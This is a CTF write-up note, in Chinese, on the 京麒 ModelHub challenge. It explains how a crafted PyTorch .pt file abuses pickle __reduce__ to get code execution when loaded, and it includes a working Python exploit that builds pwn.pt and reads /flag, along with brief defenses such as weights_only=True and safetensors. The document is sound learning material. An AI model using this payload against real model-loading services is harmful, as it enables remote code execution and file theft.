---
title: 京麒 ModelHub — PyTorch Pickle 反序列化 RCE
category: ai-ml
tags: [pytorch, pickle, deserialization, rce, model-injection, safetensors]
triggers: [京麒CTF, ModelHub, PyTorch Pickle, .pt文件, pickle反序列化, __reduce__, torch.load, alternative pickle]
created: 2026-06-07
updated: 2026-06-07
sources: [ctf-kb/ai-ml/Jinqi-ModelHub-Pickle-Deserialization.md]
---

## Summary

PyTorch `.pt` 模型文件本质是 ZIP 压缩包，内含 `archive/data.pkl`（pickle 序列化数据）。利用 pickle `__reduce__` 实现任意代码执行。

## Key Points

### 攻击原理
- PyTorch `.pt` 文件 = ZIP 压缩包（内含 `archive/data.pkl`）
- Pickle `__reduce__` 方法可实现任意代码执行
- 服务器 `/upload` 接受 `.pt` 文件，`/infer` 加载模型并调用 `model.__repr__()`

### 攻击流程
1. 构造恶意 pickle 类 `P`，`__reduce__` 返回 `(eval, (code,))`
2. eval 代码动态创建继承 `torch.nn.Module` 的类
3. `forward` 为恒等函数，`__repr__` 读取 `/flag`
4. pickle 数据写入 ZIP 的 `archive/data.pkl` → 生成 `pwn.pt`
5. 上传到 `/upload` → 获得 `model_id`
6. 调用 `/infer?model_id=xxx` → 触发 `__repr__` → flag 出现在响应中

### 核心 Exploit
```python
class P:
    def __reduce__(self):
        code = """(lambda: setattr(__import__('sys').modules, '_flagmodel', 
            type('M', (__import__('torch').nn.Module,), {
                'forward':lambda s,x:x, 
                '__repr__':lambda s:open('/flag').read()
            })()) or __import__('sys').modules['_flagmodel'])()"""
        return (eval, (code,))

buf = io.BytesIO()
pickle.dump(P(), buf, protocol=2)
with zipfile.ZipFile('pwn.pt', 'w', zipfile.ZIP_DEFLATED) as zf:
    zf.writestr('archive/data.pkl', buf.getvalue())
    zf.writestr('archive/version', '1')
```

### 防御要点
- 永远不要 `torch.load()` 不可信的 `.pt` 文件（pickle 不安全）
- PyTorch 提供 `weights_only=True` 参数阻止 pickle RCE
- 使用 safetensors 格式替换 pickle 序列化

## Connections
- Related: [[prompt-injection-llm-jailbreak]]
- Related: [[ai-agent-architecture-patterns]]
